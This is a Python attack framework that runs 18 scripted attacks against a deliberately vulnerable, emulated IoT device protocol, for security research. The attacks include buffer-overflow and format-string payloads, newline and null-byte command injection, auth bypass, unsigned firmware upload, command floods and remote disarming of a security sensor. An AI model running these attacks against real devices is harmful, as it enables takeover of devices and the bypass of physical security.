"""
VESPER Firmware Attack Framework

Implements firmware-level attacks against QEMU-emulated IoT devices.
Each attack targets a known vulnerability intentionally embedded in the
device firmware for security research and testing.

Attack Categories:
    1. Buffer Overflow - Overlong commands to overflow cmd_buf/buffers
    2. Command Injection - Malformed commands to alter device state
    3. Authentication Bypass - Exploit weak/missing auth
    4. Firmware Update Attack - Malicious firmware payload injection
    5. Information Disclosure - Extract sensitive data via debug commands
    6. Denial of Service - Crash or hang the firmware
    7. State Manipulation - Alter device behavior through protocol abuse

Each attack returns an AttackResult with success/failure, evidence, and impact.
"""

import socket
import time
import logging
import random
import string
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class AttackCategory(Enum):
    """Categories of firmware attacks."""
    BUFFER_OVERFLOW = "buffer_overflow"
    COMMAND_INJECTION = "command_injection"
    AUTH_BYPASS = "authentication_bypass"
    FW_UPDATE = "firmware_update_attack"
    INFO_DISCLOSURE = "information_disclosure"
    DENIAL_OF_SERVICE = "denial_of_service"
    STATE_MANIPULATION = "state_manipulation"
    REPLAY = "replay_attack"
    FUZZING = "protocol_fuzzing"


class AttackSeverity(Enum):
    """CVSS-inspired severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "informational"


@dataclass
class AttackResult:
    """Result of a firmware attack attempt."""
    attack_name: str
    category: AttackCategory
    severity: AttackSeverity
    success: bool
    description: str
    evidence: List[str] = field(default_factory=list)
    impact: str = ""
    mitigation: str = ""
    cve_reference: str = ""  # Similar real-world CVE
    duration_ms: float = 0.0
    raw_response: str = ""


@dataclass
class FirmwareTarget:
    """Target firmware instance for attacks."""
    host: str = "127.0.0.1"
    port: int = 15011
    device_id: str = ""
    device_type: str = ""
    timeout: float = 3.0


class FirmwareAttackFramework:
    """
    Framework for executing firmware attacks against QEMU-emulated IoT devices.

    Usage:
        target = FirmwareTarget(host="127.0.0.1", port=15011)
        framework = FirmwareAttackFramework()
        results = framework.run_all_attacks(target)
        framework.print_report(results)
    """

    def __init__(self):
        self.attacks: List[callable] = [
            self.attack_buffer_overflow_cmd,
            self.attack_buffer_overflow_setid,
            self.attack_auth_bypass_no_token,
            self.attack_auth_bypass_empty_token,
            self.attack_info_disclosure_debug_dump,
            self.attack_info_disclosure_token_leak,
            self.attack_command_injection_newline,
            self.attack_command_injection_null_byte,
            self.attack_fw_update_overflow,
            self.attack_fw_update_no_signature,
            self.attack_dos_rapid_commands,
            self.attack_dos_large_payload,
            self.attack_state_manipulation_disarm,
            self.attack_state_manipulation_calibration,
            self.attack_replay_command,
            self.attack_fuzzing_random,
            self.attack_fuzzing_format_strings,
            self.attack_schedule_oob_write,
        ]

    def _send_command(self, target: FirmwareTarget, cmd: str, timeout: float = None) -> str:
        """Send a command to the firmware and return the response."""
        t = timeout or target.timeout
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(t)
            sock.connect((target.host, target.port))
            sock.sendall((cmd + "\n").encode())

            response = b""
            deadline = time.time() + t
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    # Check for complete response (ends with newline and has data)
                    if response.endswith(b"\n") and len(response) > 2:
                        break
                except socket.timeout:
                    break

            sock.close()
            return response.decode("utf-8", errors="replace").strip()
        except Exception as e:
            return f"ERROR:CONNECTION:{e}"

    def _send_raw(self, target: FirmwareTarget, data: bytes, timeout: float = None) -> bytes:
        """Send raw bytes to the firmware."""
        t = timeout or target.timeout
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(t)
            sock.connect((target.host, target.port))
            sock.sendall(data)

            response = b""
            deadline = time.time() + t
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            sock.close()
            return response
        except Exception as e:
            return f"ERROR:{e}".encode()

    def _timed_attack(self, func, *args, **kwargs) -> AttackResult:
        """Wrapper that times an attack and catches exceptions."""
        start = time.time()
        try:
            result = func(*args, **kwargs)
            result.duration_ms = (time.time() - start) * 1000
            return result
        except Exception as e:
            return AttackResult(
                attack_name=func.__name__,
                category=AttackCategory.FUZZING,
                severity=AttackSeverity.INFO,
                success=False,
                description=f"Attack threw exception: {e}",
                duration_ms=(time.time() - start) * 1000,
            )

    # ─── Attack 1: Buffer Overflow in Command Buffer ─────────────────────

    def attack_buffer_overflow_cmd(self, target: FirmwareTarget) -> AttackResult:
        """
        Send a command longer than cmd_buf[64] to overflow the buffer.
        The firmware uses a fixed 64-byte command buffer. Sending >63 chars
        may corrupt adjacent memory.
        """
        # Generate overlong command
        payload = "A" * 128
        resp = self._send_command(target, payload)

        # Try again with pattern to detect crash
        status_resp = self._send_command(target, "STATUS")

        evidence = []
        success = False

        if "ERROR" in resp and "UNKNOWN" in resp:
            evidence.append(f"Firmware processed overlong command (responded with ERROR)")
            evidence.append(f"No crash detected — buffer truncation may be in place")

        if "STATUS:OK" not in status_resp:
            success = True
            evidence.append(f"Device unresponsive after overflow! Response: {status_resp[:100]}")
        else:
            evidence.append(f"Device still responsive after 128-byte input")

        # Try with much larger payload
        mega_payload = "X" * 1024
        mega_resp = self._send_command(target, mega_payload)
        mega_status = self._send_command(target, "STATUS")

        if "STATUS:OK" not in mega_status:
            success = True
            evidence.append(f"Device crashed after 1024-byte payload!")

        return AttackResult(
            attack_name="Buffer Overflow (Command Buffer)",
            category=AttackCategory.BUFFER_OVERFLOW,
            severity=AttackSeverity.HIGH if success else AttackSeverity.MEDIUM,
            success=success,
            description="Attempt to overflow the 64-byte command buffer with overlong input",
            evidence=evidence,
            impact="Memory corruption, potential code execution" if success else "Input truncated safely",
            mitigation="Add strict bounds checking on command input length",
            cve_reference="CVE-2020-12695 (UPnP buffer overflow in IoT devices)",
            raw_response=resp[:200],
        )

    # ─── Attack 2: Buffer Overflow in SET_ID ─────────────────────────────

    def attack_buffer_overflow_setid(self, target: FirmwareTarget) -> AttackResult:
        """
        Overflow the device_id[32] buffer via SET_ID command.
        The firmware copies input to a 32-byte buffer with str_copy
        that limits to max-1, but SET_ID is commonly implemented
        with less careful bounds checking.
        """
        # Original ID
        orig_resp = self._send_command(target, "IDENTIFY")

        # Set a very long ID
        long_id = "B" * 64
        set_resp = self._send_command(target, f"SET_ID:{long_id}")

        # Read back
        new_resp = self._send_command(target, "IDENTIFY")

        evidence = [
            f"Original IDENTIFY: {orig_resp[:100]}",
            f"SET_ID response: {set_resp[:100]}",
            f"Post-overflow IDENTIFY: {new_resp[:100]}",
        ]

        success = False
        # Check if adjacent memory was corrupted
        if long_id[:31] in new_resp:
            evidence.append("Long ID accepted and stored (truncated to buffer size)")

        # Check device stability
        status = self._send_command(target, "STATUS")
        if "STATUS:OK" not in status:
            success = True
            evidence.append("Device unstable after SET_ID overflow!")

        return AttackResult(
            attack_name="Buffer Overflow (SET_ID)",
            category=AttackCategory.BUFFER_OVERFLOW,
            severity=AttackSeverity.MEDIUM,
            success=success,
            description="Overflow device_id[32] buffer via SET_ID command",
            evidence=evidence,
            impact="Device ID corruption, adjacent memory overwrite",
            mitigation="Validate input length before copy, use safe string functions",
            cve_reference="CVE-2021-28372 (ThroughTek IoT device overflow)",
            raw_response=set_resp[:200],
        )

    # ─── Attack 3: Authentication Bypass - No Token ──────────────────────

    def attack_auth_bypass_no_token(self, target: FirmwareTarget) -> AttackResult:
        """
        Test if commands work without authentication.
        The firmware has an AUTH command but doesn't enforce it.
        """
        # Send privileged commands without any authentication
        responses = {}
        for cmd in ["ON", "OFF", "SET_ID:hacked", "REBOOT", "DEBUG_DUMP"]:
            resp = self._send_command(target, cmd)
            responses[cmd] = resp

        evidence = []
        success = False

        for cmd, resp in responses.items():
            if "ERROR:AUTH" not in resp and "ERROR" not in resp.split(":")[0]:
                success = True
                evidence.append(f"'{cmd}' executed without auth: {resp[:60]}")
            else:
                evidence.append(f"'{cmd}' blocked without auth")

        # Restore device
        self._send_command(target, "SET_ID:restored-device")

        return AttackResult(
            attack_name="Authentication Bypass (No Token)",
            category=AttackCategory.AUTH_BYPASS,
            severity=AttackSeverity.CRITICAL if success else AttackSeverity.LOW,
            success=success,
            description="Execute privileged commands without any authentication token",
            evidence=evidence,
            impact="Full device control without credentials",
            mitigation="Implement mandatory authentication for all state-changing commands",
            cve_reference="CVE-2019-19356 (Netis router auth bypass)",
        )

    # ─── Attack 4: Authentication Bypass - Empty/Fake Token ──────────────

    def attack_auth_bypass_empty_token(self, target: FirmwareTarget) -> AttackResult:
        """
        The AUTH command always returns AUTH:OK regardless of the token value.
        This is a hardcoded acceptance vulnerability.
        """
        test_tokens = [
            "",                    # Empty
            "admin",               # Common default
            "x" * 100,            # Overlong
            "../../etc/passwd",    # Path traversal
            "\x00\x00\x00\x00",  # Null bytes
        ]

        evidence = []
        success = False

        for token in test_tokens:
            resp = self._send_command(target, f"AUTH:{token}")
            if "AUTH:OK" in resp:
                success = True
                evidence.append(f"Token '{token[:20]}...' accepted: {resp[:50]}")
            else:
                evidence.append(f"Token '{token[:20]}...' rejected")

        return AttackResult(
            attack_name="Authentication Bypass (Weak Token Validation)",
            category=AttackCategory.AUTH_BYPASS,
            severity=AttackSeverity.CRITICAL if success else AttackSeverity.LOW,
            success=success,
            description="AUTH command accepts any token value including empty strings",
            evidence=evidence,
            impact="Any attacker can authenticate with arbitrary credentials",
            mitigation="Implement proper token validation, use challenge-response auth",
            cve_reference="CVE-2020-25078 (D-Link DCS camera hardcoded credentials)",
        )

    # ─── Attack 5: Information Disclosure - Debug Dump ────────────────────

    def attack_info_disclosure_debug_dump(self, target: FirmwareTarget) -> AttackResult:
        """
        The DEBUG_DUMP command exposes internal state including auth tokens,
        random seeds, and memory contents without any authentication.
        """
        # First set a "secret" auth token
        self._send_command(target, "AUTH:super_secret_token_12345")

        # Now dump debug info
        dump_resp = self._send_command(target, "DEBUG_DUMP")

        evidence = []
        success = False

        if "DEBUG:MEMORY_DUMP" in dump_resp:
            success = True
            evidence.append("DEBUG_DUMP command accessible without authentication")

        if "TOKEN:" in dump_resp:
            # Check if our secret token is in the dump
            if "super_secret_token_12345" in dump_resp:
                evidence.append("AUTH TOKEN LEAKED in debug output!")
            evidence.append(f"Token field exposed: {dump_resp}")

        if "SEED:" in dump_resp:
            evidence.append("Random seed exposed — enables prediction of random values")

        return AttackResult(
            attack_name="Information Disclosure (Debug Dump)",
            category=AttackCategory.INFO_DISCLOSURE,
            severity=AttackSeverity.HIGH if success else AttackSeverity.LOW,
            success=success,
            description="DEBUG_DUMP command exposes sensitive internal state without auth",
            evidence=evidence,
            impact="Auth token theft, PRNG seed disclosure enables state prediction",
            mitigation="Remove DEBUG_DUMP in production, require admin auth for debug commands",
            cve_reference="CVE-2021-36260 (Hikvision debug endpoint info disclosure)",
        )

    # ─── Attack 6: Information Disclosure - Token Leak via Response ──────

    def attack_info_disclosure_token_leak(self, target: FirmwareTarget) -> AttackResult:
        """
        After AUTH, check if the token leaks through other responses.
        """
        secret = "my_secret_auth_key_42"
        self._send_command(target, f"AUTH:{secret}")

        evidence = []
        success = False

        # Check various commands for token leakage
        for cmd in ["STATUS", "IDENTIFY", "GET_ALL", "GET_SWITCH"]:
            resp = self._send_command(target, cmd)
            if secret in resp:
                success = True
                evidence.append(f"Token leaked in '{cmd}' response!")
            else:
                evidence.append(f"Token not in '{cmd}' response (safe)")

        return AttackResult(
            attack_name="Information Disclosure (Token Leakage)",
            category=AttackCategory.INFO_DISCLOSURE,
            severity=AttackSeverity.MEDIUM if success else AttackSeverity.INFO,
            success=success,
            description="Check if auth token leaks through normal command responses",
            evidence=evidence,
            impact="Credential theft via traffic interception",
            mitigation="Never echo credentials in responses, use one-way hashing",
        )

    # ─── Attack 7: Command Injection via Newline ─────────────────────────

    def attack_command_injection_newline(self, target: FirmwareTarget) -> AttackResult:
        """
        Inject a second command by embedding a newline in the payload.
        e.g., "GET_SWITCH\nOFF" should only get switch status but also turns it off.
        """
        # First turn device ON
        self._send_command(target, "ON")
        time.sleep(0.2)

        # Verify it's on
        initial = self._send_command(target, "GET_SWITCH")

        # Try newline injection
        injected_resp = self._send_command(target, "GET_SWITCH\nOFF")
        time.sleep(0.2)

        # Check if OFF was executed
        final = self._send_command(target, "GET_SWITCH")

        evidence = [
            f"Initial state: {initial}",
            f"Injection response: {injected_resp[:100]}",
            f"Final state: {final}",
        ]

        success = "off" in final.lower() and "on" in initial.lower()
        if success:
            evidence.append("Command injection successful! OFF executed via newline injection")

        # Restore
        self._send_command(target, "ON")

        return AttackResult(
            attack_name="Command Injection (Newline)",
            category=AttackCategory.COMMAND_INJECTION,
            severity=AttackSeverity.HIGH if success else AttackSeverity.LOW,
            success=success,
            description="Embed newline character to inject a second command in single request",
            evidence=evidence,
            impact="Arbitrary command execution via crafted input",
            mitigation="Sanitize input, reject commands containing control characters",
            cve_reference="CVE-2019-17621 (D-Link command injection)",
        )

    # ─── Attack 8: Command Injection via Null Byte ───────────────────────

    def attack_command_injection_null_byte(self, target: FirmwareTarget) -> AttackResult:
        """
        Send commands with embedded null bytes to test string handling.
        C firmware using strlen/strcmp may be confused by null bytes.
        """
        # Send command with embedded null
        payload = b"STATUS\x00EVIL_COMMAND\n"
        resp = self._send_raw(target, payload)
        resp_text = resp.decode("utf-8", errors="replace")

        evidence = [f"Response to null-byte injection: {resp_text[:100]}"]

        # Check if the part after null was processed
        success = "EVIL" in resp_text or resp_text.count("STATUS") > 1

        return AttackResult(
            attack_name="Command Injection (Null Byte)",
            category=AttackCategory.COMMAND_INJECTION,
            severity=AttackSeverity.MEDIUM if success else AttackSeverity.LOW,
            success=success,
            description="Embed null bytes in commands to confuse C string handling",
            evidence=evidence,
            impact="Bypass input validation, inject commands",
            mitigation="Handle null bytes explicitly in input parsing",
        )

    # ─── Attack 9: Firmware Update Overflow ──────────────────────────────

    def attack_fw_update_overflow(self, target: FirmwareTarget) -> AttackResult:
        """
        Exploit the FW_UPDATE command buffer overflow vulnerability.
        The smart_light firmware has fw_update_buf[128] with no size check.
        Sending >128 bytes overflows into adjacent memory.
        """
        # Normal-sized update
        small_update = "A" * 64
        resp1 = self._send_command(target, f"FW_UPDATE:{small_update}")

        # Overflow update
        overflow_update = "B" * 256
        resp2 = self._send_command(target, f"FW_UPDATE:{overflow_update}")

        evidence = [
            f"Normal FW_UPDATE (64 bytes): {resp1[:80]}",
            f"Overflow FW_UPDATE (256 bytes): {resp2[:80]}",
        ]

        # Check device stability
        status = self._send_command(target, "STATUS")
        success = "FW_UPDATE:ACCEPTED" in resp2

        if "STATUS:OK" not in status:
            success = True
            evidence.append("Device crashed after firmware update overflow!")
        elif "FW_UPDATE:ACCEPTED" in resp2:
            evidence.append("Oversized firmware payload accepted without size validation")

        return AttackResult(
            attack_name="Firmware Update Buffer Overflow",
            category=AttackCategory.FW_UPDATE,
            severity=AttackSeverity.CRITICAL if success else AttackSeverity.MEDIUM,
            success=success,
            description="Overflow fw_update_buf[128] via FW_UPDATE command",
            evidence=evidence,
            impact="Memory corruption, potential arbitrary code execution",
            mitigation="Validate firmware size, use secure boot, verify signatures",
            cve_reference="CVE-2022-25845 (Firmware update vulnerability in smart devices)",
        )

    # ─── Attack 10: Unsigned Firmware Update ──────────────────────────────

    def attack_fw_update_no_signature(self, target: FirmwareTarget) -> AttackResult:
        """
        Upload a fake firmware payload — no signature verification.
        """
        # Craft a "malicious" firmware payload
        fake_fw = "MALICIOUS_FIRMWARE_PAYLOAD_" + "X" * 50

        resp = self._send_command(target, f"FW_UPDATE:{fake_fw}")
        apply_resp = self._send_command(target, "FW_APPLY")

        evidence = [
            f"FW_UPDATE response: {resp[:80]}",
            f"FW_APPLY response: {apply_resp[:80]}",
        ]

        success = "ACCEPTED" in resp or "INSTALLING" in apply_resp
        if success:
            evidence.append("Unsigned firmware payload accepted and applied!")

        return AttackResult(
            attack_name="Unsigned Firmware Update",
            category=AttackCategory.FW_UPDATE,
            severity=AttackSeverity.CRITICAL if success else AttackSeverity.LOW,
            success=success,
            description="Upload arbitrary firmware with no cryptographic signature check",
            evidence=evidence,
            impact="Complete device takeover via malicious firmware",
            mitigation="Implement secure boot chain with signed firmware verification",
            cve_reference="CVE-2020-10882 (TP-Link unsigned firmware update)",
        )

    # ─── Attack 11: DoS via Rapid Commands ───────────────────────────────

    def attack_dos_rapid_commands(self, target: FirmwareTarget) -> AttackResult:
        """
        Flood the firmware with rapid commands to cause denial of service.
        """
        # Verify device is responsive
        pre_status = self._send_command(target, "STATUS")

        # Flood with commands
        flood_count = 100
        start = time.time()
        success_count = 0

        for i in range(flood_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target.host, target.port))
                sock.sendall(b"STATUS\n")
                resp = sock.recv(256)
                if b"STATUS:OK" in resp:
                    success_count += 1
                sock.close()
            except Exception:
                pass

        flood_duration = time.time() - start

        # Check if device is still responsive
        time.sleep(0.5)
        post_status = self._send_command(target, "STATUS")

        evidence = [
            f"Pre-flood status: {pre_status[:50]}",
            f"Flood: {flood_count} commands in {flood_duration:.2f}s",
            f"Success during flood: {success_count}/{flood_count}",
            f"Post-flood status: {post_status[:50]}",
        ]

        success = "STATUS:OK" not in post_status or success_count < flood_count * 0.5
        if success:
            evidence.append("Device degraded or unresponsive after command flood!")

        return AttackResult(
            attack_name="Denial of Service (Command Flood)",
            category=AttackCategory.DENIAL_OF_SERVICE,
            severity=AttackSeverity.MEDIUM if success else AttackSeverity.LOW,
            success=success,
            description=f"Flood device with {flood_count} rapid commands",
            evidence=evidence,
            impact="Device becomes unresponsive, legitimate commands fail",
            mitigation="Implement rate limiting, connection throttling",
        )

    # ─── Attack 12: DoS via Large Payload ────────────────────────────────

    def attack_dos_large_payload(self, target: FirmwareTarget) -> AttackResult:
        """
        Send extremely large payloads to exhaust device resources.
        """
        pre_status = self._send_command(target, "STATUS")

        # Send increasingly large payloads
        sizes = [1024, 4096, 16384, 65536]
        responses = []

        for size in sizes:
            payload = "Z" * size
            resp = self._send_command(target, payload, timeout=2.0)
            responses.append((size, resp[:60]))

        post_status = self._send_command(target, "STATUS")

        evidence = [
            f"Pre-test: {pre_status[:50]}",
        ]
        for size, resp in responses:
            evidence.append(f"  {size}B payload: {resp}")
        evidence.append(f"Post-test: {post_status[:50]}")

        success = "STATUS:OK" not in post_status

        return AttackResult(
            attack_name="Denial of Service (Large Payload)",
            category=AttackCategory.DENIAL_OF_SERVICE,
            severity=AttackSeverity.MEDIUM if success else AttackSeverity.LOW,
            success=success,
            description="Send large payloads (up to 64KB) to exhaust device resources",
            evidence=evidence,
            impact="Resource exhaustion, device crash",
            mitigation="Limit maximum input size, implement input validation",
        )

    # ─── Attack 13: State Manipulation - Disarm ──────────────────────────

    def attack_state_manipulation_disarm(self, target: FirmwareTarget) -> AttackResult:
        """
        Remotely disarm a security sensor without authentication.
        This simulates an attacker disabling a motion/door sensor.
        """
        # Ensure armed
        self._send_command(target, "ON")
        self._send_command(target, "ARM")
        time.sleep(0.2)

        pre_state = self._send_command(target, "GET_SWITCH")

        # Attacker disarms without auth
        disarm_resp = self._send_command(target, "DISARM")
        off_resp = self._send_command(target, "OFF")

        post_state = self._send_command(target, "GET_SWITCH")

        evidence = [
            f"Before attack: {pre_state}",
            f"DISARM response: {disarm_resp[:60]}",
            f"OFF response: {off_resp[:60]}",
            f"After attack: {post_state}",
        ]

        success = "off" in post_state.lower() or "no" in disarm_resp.lower()
        if success:
            evidence.append("Sensor disarmed! Physical security compromised.")

        # Restore
        self._send_command(target, "ON")
        self._send_command(target, "ARM")

        return AttackResult(
            attack_name="State Manipulation (Sensor Disarm)",
            category=AttackCategory.STATE_MANIPULATION,
            severity=AttackSeverity.CRITICAL if success else AttackSeverity.LOW,
            success=success,
            description="Remotely disable a security sensor without authentication",
            evidence=evidence,
            impact="Physical security bypass — motion/door sensor disabled",
            mitigation="Require authenticated commands for security-critical operations",
            cve_reference="CVE-2019-9483 (SimpliSafe alarm disarm vulnerability)",
        )

    # ─── Attack 14: State Manipulation - Calibration Abuse ───────────────

    def attack_state_manipulation_calibration(self, target: FirmwareTarget) -> AttackResult:
        """
        Abuse the CALIBRATE command with invalid values.
        The temperature sensor casts to uint8_t, losing sign info.
        Setting extreme offsets corrupts readings.
        """
        # Get baseline
        temp_resp = self._send_command(target, "GET_TEMP")

        # Apply extreme calibration
        cal_resp = self._send_command(target, "CALIBRATE:-128")

        # Read corrupted temperature
        post_temp = self._send_command(target, "GET_TEMP")

        evidence = [
            f"Original temp: {temp_resp}",
            f"CALIBRATE:-128 response: {cal_resp[:60]}",
            f"Post-calibration temp: {post_temp}",
        ]

        success = "CALIBRATED" in cal_resp or "ACK" in cal_resp
        if success:
            evidence.append("Invalid calibration accepted — sensor readings corrupted!")

        # Reset
        self._send_command(target, "CALIBRATE:0")

        return AttackResult(
            attack_name="State Manipulation (Calibration Abuse)",
            category=AttackCategory.STATE_MANIPULATION,
            severity=AttackSeverity.MEDIUM if success else AttackSeverity.LOW,
            success=success,
            description="Corrupt sensor readings via CALIBRATE command with invalid values",
            evidence=evidence,
            impact="Falsified sensor data, incorrect automation triggers",
            mitigation="Validate calibration ranges, require authentication",
        )

    # ─── Attack 15: Replay Attack ────────────────────────────────────────

    def attack_replay_command(self, target: FirmwareTarget) -> AttackResult:
        """
        Capture and replay a command to demonstrate lack of replay protection.
        Real protocols use nonces/timestamps to prevent this.
        """
        # "Capture" a legitimate command
        captured_cmd = "ON"

        # Turn device off first
        self._send_command(target, "OFF")
        time.sleep(0.2)
        verify_off = self._send_command(target, "GET_SWITCH")

        # "Replay" the captured command
        replay_resp = self._send_command(target, captured_cmd)
        verify_on = self._send_command(target, "GET_SWITCH")

        evidence = [
            f"Device off: {verify_off}",
            f"Replayed 'ON': {replay_resp[:50]}",
            f"Device after replay: {verify_on}",
        ]

        success = "on" in verify_on.lower()
        if success:
            evidence.append("Replay attack successful — no nonce/timestamp protection")

        return AttackResult(
            attack_name="Replay Attack",
            category=AttackCategory.REPLAY,
            severity=AttackSeverity.HIGH if success else AttackSeverity.LOW,
            success=success,
            description="Replay previously captured commands — no freshness validation",
            evidence=evidence,
            impact="Attacker can replay any previously observed command",
            mitigation="Implement nonces, timestamps, or sequence numbers in protocol",
            cve_reference="CVE-2018-11714 (Zigbee replay vulnerability)",
        )

    # ─── Attack 16: Protocol Fuzzing - Random ────────────────────────────

    def attack_fuzzing_random(self, target: FirmwareTarget) -> AttackResult:
        """
        Send random data to discover unexpected behavior or crashes.
        """
        evidence = []
        crash_detected = False
        error_responses = []

        # Generate various malformed inputs
        test_cases = [
            b"\xff" * 32,
            b"\x00" * 32,
            b"\r\n" * 50,
            "".join(random.choices(string.printable, k=100)).encode(),
            b"GET_" + b"\xff" * 20 + b"\n",
            b"SET_" + bytes(range(256)) + b"\n",
            b"A" * 200 + b"\n" + b"B" * 200 + b"\n",
            b"\x01\x02\x03\x04\x05\x06\x07\x08",
        ]

        for i, tc in enumerate(test_cases):
            resp = self._send_raw(target, tc)
            resp_text = resp.decode("utf-8", errors="replace")[:80]
            evidence.append(f"Fuzz #{i}: {len(tc)}B → {resp_text}")

            if "ERROR" in resp_text:
                error_responses.append(i)

        # Final health check
        status = self._send_command(target, "STATUS")
        if "STATUS:OK" not in status:
            crash_detected = True
            evidence.append("DEVICE CRASHED during fuzzing!")

        return AttackResult(
            attack_name="Protocol Fuzzing (Random)",
            category=AttackCategory.FUZZING,
            severity=AttackSeverity.HIGH if crash_detected else AttackSeverity.LOW,
            success=crash_detected,
            description=f"Sent {len(test_cases)} random/malformed inputs to test robustness",
            evidence=evidence,
            impact="Device crash or unexpected behavior" if crash_detected else "Device handled malformed input",
            mitigation="Implement robust input validation, fuzz testing in CI",
        )

    # ─── Attack 17: Format String Attack ─────────────────────────────────

    def attack_fuzzing_format_strings(self, target: FirmwareTarget) -> AttackResult:
        """
        Test for format string vulnerabilities.
        If firmware uses printf-like functions with user input as format string,
        %s/%x/%n could leak/corrupt memory.
        """
        format_strings = [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n",
            "%08x." * 10,
            "AAAA%08x.%08x.%08x.%08x",
            "%p%p%p%p%p",
        ]

        evidence = []
        success = False

        for fs in format_strings:
            resp = self._send_command(target, fs)
            if resp and resp != f"ERROR:UNKNOWN:{fs}":
                # Check if we got hex values (memory leak)
                if any(c in resp for c in "0123456789abcdef" if len(resp) > 20):
                    evidence.append(f"Format string '{fs[:30]}' → suspicious: {resp[:80]}")
                else:
                    evidence.append(f"Format string '{fs[:30]}' → {resp[:60]}")

        # Health check
        status = self._send_command(target, "STATUS")
        if "STATUS:OK" not in status:
            success = True
            evidence.append("Device crashed from format string!")

        return AttackResult(
            attack_name="Format String Attack",
            category=AttackCategory.FUZZING,
            severity=AttackSeverity.HIGH if success else AttackSeverity.LOW,
            success=success,
            description="Test format string vulnerability with %s/%x/%n payloads",
            evidence=evidence,
            impact="Memory disclosure or corruption via format strings" if success else "No format string vulnerability",
            mitigation="Never use user input as printf format string",
            cve_reference="CVE-2019-14889 (libssh format string vulnerability)",
        )

    # ─── Attack 18: Out-of-Bounds Write via Schedule ─────────────────────

    def attack_schedule_oob_write(self, target: FirmwareTarget) -> AttackResult:
        """
        The smart_plug SET_SCHEDULE command doesn't bounds-check the index.
        SET_SCHEDULE:9:12345 writes to schedule[9] but array is only size 4.
        """
        # Normal schedule
        resp_ok = self._send_command(target, "SET_SCHEDULE:0:100")

        # Out-of-bounds writes
        oob_responses = []
        for idx in [4, 5, 8, 9, 15, 99]:
            resp = self._send_command(target, f"SET_SCHEDULE:{idx}:99999")
            oob_responses.append((idx, resp[:60]))

        evidence = [
            f"Normal SET_SCHEDULE:0: {resp_ok[:60]}",
        ]

        success = False
        for idx, resp in oob_responses:
            if "SCHEDULE:" in resp and "ACK" in resp:
                success = True
                evidence.append(f"OOB index {idx} ACCEPTED: {resp}")
            else:
                evidence.append(f"OOB index {idx}: {resp}")

        # Health check
        status = self._send_command(target, "STATUS")
        if "STATUS:OK" not in status:
            success = True
            evidence.append("Device crashed from OOB write!")

        return AttackResult(
            attack_name="Out-of-Bounds Write (Schedule Array)",
            category=AttackCategory.BUFFER_OVERFLOW,
            severity=AttackSeverity.HIGH if success else AttackSeverity.LOW,
            success=success,
            description="Write beyond schedule[4] array bounds via SET_SCHEDULE command",
            evidence=evidence,
            impact="Arbitrary memory write, potential code execution",
            mitigation="Validate array index bounds before write",
            cve_reference="CVE-2021-33104 (IoT OOB write vulnerability)",
        )

    # ─── Run All Attacks ─────────────────────────────────────────────────

    def run_all_attacks(self, target: FirmwareTarget) -> List[AttackResult]:
        """Execute all attacks against the target and return results."""
        logger.info(f"Starting firmware attack suite against {target.host}:{target.port}")
        results = []

        for attack_func in self.attacks:
            logger.info(f"  Running: {attack_func.__name__}")
            result = self._timed_attack(attack_func, target)
            results.append(result)

            # Small delay between attacks
            time.sleep(0.3)

        return results

    def run_attack_by_name(self, target: FirmwareTarget, name: str) -> Optional[AttackResult]:
        """Run a specific attack by name."""
        for attack_func in self.attacks:
            if name in attack_func.__name__:
                return self._timed_attack(attack_func, target)
        return None

    def run_attacks_by_category(
        self, target: FirmwareTarget, category: AttackCategory
    ) -> List[AttackResult]:
        """Run all attacks in a specific category."""
        results = []
        for attack_func in self.attacks:
            # Run it to get the result and check category
            result = self._timed_attack(attack_func, target)
            if result.category == category:
                results.append(result)
            time.sleep(0.2)
        return results

    @staticmethod
    def print_report(results: List[AttackResult]):
        """Print a formatted attack report."""
        print("\n" + "=" * 80)
        print("  VESPER FIRMWARE SECURITY ASSESSMENT REPORT")
        print("=" * 80)

        total = len(results)
        successful = sum(1 for r in results if r.success)

        # Summary
        print(f"\n  Total Attacks: {total}")
        print(f"  Successful:    {successful} ({successful/total*100:.0f}%)")
        print(f"  Failed:        {total - successful}")

        # By severity
        print("\n  By Severity:")
        for sev in AttackSeverity:
            count = sum(1 for r in results if r.severity == sev and r.success)
            total_sev = sum(1 for r in results if r.severity == sev)
            if total_sev > 0:
                print(f"    {sev.value:15s}: {count}/{total_sev} successful")

        # Details
        print("\n" + "-" * 80)
        for i, r in enumerate(results, 1):
            status = "✓ VULNERABLE" if r.success else "✗ Not exploitable"
            sev_color = {
                AttackSeverity.CRITICAL: "🔴",
                AttackSeverity.HIGH: "🟠",
                AttackSeverity.MEDIUM: "🟡",
                AttackSeverity.LOW: "🟢",
                AttackSeverity.INFO: "⚪",
            }

            print(f"\n  [{i:02d}] {sev_color.get(r.severity, '')} {r.attack_name}")
            print(f"       Category:  {r.category.value}")
            print(f"       Severity:  {r.severity.value}")
            print(f"       Status:    {status}")
            print(f"       Duration:  {r.duration_ms:.1f}ms")
            print(f"       Description: {r.description}")
            if r.evidence:
                print(f"       Evidence:")
                for e in r.evidence[:5]:
                    print(f"         - {e[:100]}")
            if r.impact:
                print(f"       Impact: {r.impact}")
            if r.mitigation:
                print(f"       Mitigation: {r.mitigation}")
            if r.cve_reference:
                print(f"       Similar CVE: {r.cve_reference}")

        print("\n" + "=" * 80)

    @staticmethod
    def export_results(results: List[AttackResult], filepath: str):
        """Export attack results to JSON."""
        import json
        data = []
        for r in results:
            data.append({
                "attack_name": r.attack_name,
                "category": r.category.value,
                "severity": r.severity.value,
                "success": r.success,
                "description": r.description,
                "evidence": r.evidence,
                "impact": r.impact,
                "mitigation": r.mitigation,
                "cve_reference": r.cve_reference,
                "duration_ms": r.duration_ms,
            })

        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
        logger.info(f"Exported {len(data)} attack results to {filepath}")
